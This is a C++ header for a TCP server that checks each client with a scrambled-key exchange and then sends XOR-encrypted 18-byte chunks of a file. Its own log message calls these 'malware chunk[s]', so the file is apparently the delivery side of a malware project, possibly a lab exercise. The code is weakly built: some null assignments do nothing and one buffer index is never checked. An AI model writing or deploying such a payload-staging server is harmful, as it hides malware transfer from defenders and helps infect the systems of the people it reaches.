#ifndef NETWORK_HPP
#define NETWORK_HPP

#include <fstream>
#include <iostream>
#include <ctime> 
#include <cstring> 
#include <stdio.h> 
#include <unordered_map>  
#include <netinet/in.h> 
#include <signal.h> 
#include <unistd.h> 
#include <string.h> 
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MAX_BUFFER 1024
#define MAX_CONNECTION 10
#define DEFAULT_PORT "8080"
#define NETWORK_CHUNKS 8
#define NETWORK_CHUNK_SIZE 18


/* Get a functional server sock*/
int init_server(){    
    // Init sokcet type as a server 
    int serverSock, returnVal;
    int reuse = 1;
    struct addrinfo hints, *ai, *p;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    if ((returnVal = getaddrinfo(NULL, DEFAULT_PORT, &hints, &ai)) != 0) {
        std::cerr << "Init getaddrinfo() failed " << gai_strerror(returnVal); 
        exit(1);
    }

    // Try for a valid listening socket
    for(p = ai; p != NULL; p = p->ai_next) {
        serverSock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (serverSock < 0) { 
            continue;
        }
        
        setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int));

        if (bind(serverSock, p->ai_addr, p->ai_addrlen) < 0) {
            close(serverSock);
            continue;
        }

        break;
    }

    if (p == NULL) {
        std::cerr << "server failed to bind available address" << std::endl;
        exit(2);
    }

    freeaddrinfo(ai); // found a valid address, hance no need in the addresses list

    if (listen(serverSock, 10) == -1) {
        std::cerr << "listen() error " << std::strerror(errno) << std::endl;
        exit(3);
    }

    return serverSock;
}


char* get_peer_ip(int socketDescriptor) {    
    struct sockaddr_storage addr;
    socklen_t addrLength = sizeof(addr);

    if (getpeername(socketDescriptor, (struct sockaddr*)&addr, &addrLength) == 0) {
        static char ip[INET6_ADDRSTRLEN];

        // Check if the address family is IPv4 or IPv6
        if (addr.ss_family == AF_INET) {
            struct sockaddr_in* s = (struct sockaddr_in*)&addr;
            inet_ntop(AF_INET, &(s->sin_addr), ip, INET6_ADDRSTRLEN);
        } else if (addr.ss_family == AF_INET6) {
            struct sockaddr_in6* s = (struct sockaddr_in6*)&addr;
            inet_ntop(AF_INET6, &(s->sin6_addr), ip, INET6_ADDRSTRLEN);
        }

        return ip;
    } 
    else {
        return nullptr;
    }
}


void shuffle_key(char *key){      
    for (int i = 0; i < 5; i++){
        char temp = key[i];
        key[i] = key[(10 - i - 1)] ^ 27;
        key[(10 - i - 1)] = temp ^ 27;
    }
    
}


void enc_message(char* buffer, char* key , int len ){
    for ( int i = 0,key_index = 0; i < len; i++, key_index++){
        if (key_index == 10) {
            key_index = 0;
        }
        buffer[i] = buffer[i] ^ key[key_index];
    }
} 


int handle_new_connection(int clientSock, char* recvData , char *returnKey){
    // Auth rotuine -> send 10 bytes long key
    if (strcmp ("established connection", recvData) != 0) {
        returnKey = nullptr;
        return -1;
    }
    char serverKey[10] = {0};
    std::srand(std::time(nullptr));
    for (auto &ch : serverKey) {
        ch = 48 + rand() % 77;
    }
    std::cout << "[Data] Sending (" << get_peer_ip(clientSock) << ") key -> ";
    std::cout.write(serverKey,10)  << std::endl;
    send(clientSock , serverKey, 10, 0); 
    
    // Init data for select
    fd_set readFD;
    FD_ZERO(&readFD);
    FD_SET(clientSock , &readFD);

    struct timeval timeout;
    timeout.tv_sec = 35;
    timeout.tv_usec = 0;

    int totalBytesReceived = 0; 
    char buildKey[10] = {0};
    int last_index = 0;
    int status; 

    while(totalBytesReceived < 10) {
        status = select(clientSock + 1, &readFD, NULL, NULL, &timeout);
        if (status == -1) {
            std::cerr <<"[!] Select failed while handling client authentication" << std::strerror(errno) << std::endl;
        }
        else if (status == 0) {
            std::cout << "[!] Timeout, client failed to authenticate in time " << std::endl;
            break;
        }
        else {
            
            char clinetResponse[10] = {0};
            status = recv(clientSock, clinetResponse, 10, 0);
            if (status == -1) {
                std::cerr <<"[!] recv failed while handling client auth" << std::strerror(errno) << std::endl;
                return -1; 
            }
            else if( status == 0 ){
                std::cout << "[!] Connection closed by peer " << std::endl;
                return -1;
            }
            else {
                // build the key
                totalBytesReceived += status;
                if (totalBytesReceived > 10) {
                    std::cout << "[!] recv() overflow in validating " << get_peer_ip(clientSock) << " key" << std::endl;
                    return -1;
                }
                if (totalBytesReceived <= 10) {
                    for (int i = 0; i < status; i ++){
                        buildKey[i+last_index] = clinetResponse[i];
                    }
                    last_index += status;
                    if (totalBytesReceived < 10 ){continue;}
                }
                
                // check validity
                shuffle_key(serverKey);
                if (memcmp(buildKey , serverKey ,10) !=0 ) {return -1;}
                memcpy(returnKey,buildKey,10);;
                return 0;                   
            } 
        }      
    } 
    
    returnKey = nullptr;
    return -1;
}


int handle_connection(int clientSock, char *recvData){
    char buff[NETWORK_CHUNK_SIZE] = {0};
    int totalbytesSent = 0;
    std::ifstream file("test_file.txt", std::ios::binary);
    if (!file) {
        std::cerr << "[!] Error while opening file " << std::strerror(errno) << std::endl;
        return -1;
    }

    if (recvData[10] < 0 || recvData[10] > NETWORK_CHUNKS) {
        std::cout << "[!] Request unkonwn chunk: " << recvData[10]<< std::endl;
        return -1;
    }

    file.seekg((recvData[10] * NETWORK_CHUNK_SIZE));
    file.read(buff, NETWORK_CHUNK_SIZE );
    file.close();

    enc_message(buff, recvData , NETWORK_CHUNK_SIZE);
    while (totalbytesSent < NETWORK_CHUNK_SIZE) {
        int bytesSent = send(clientSock, buff + totalbytesSent, NETWORK_CHUNK_SIZE - totalbytesSent, 0);
        if (bytesSent == 0 || bytesSent == -1) {
            std::cout << "[!] Failed sending malware chunk " << std::endl;
            return -1;
        }
        totalbytesSent += bytesSent;
    }
        
    return 0;
}

#endif // !NETWOTK_HPP 




































